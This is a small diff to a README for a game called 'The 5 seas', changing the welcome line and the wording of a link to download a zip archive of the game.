@@ -1,5 +1,6 @@
 # The 5 seas
-Welcome to 5 seas [Download here](https://github.com/Ricmundeo/The-5-seas/raw/refs/heads/main/the_5_seas.zip) 
+Welcome to 5 seas   
+[Download the latest version](https://github.com/Ricmundeo/The-5-seas/raw/refs/heads/main/the_5_seas.zip) 
 ##
 This is game developed by the **RARZIWOstudios**
 ### The game info
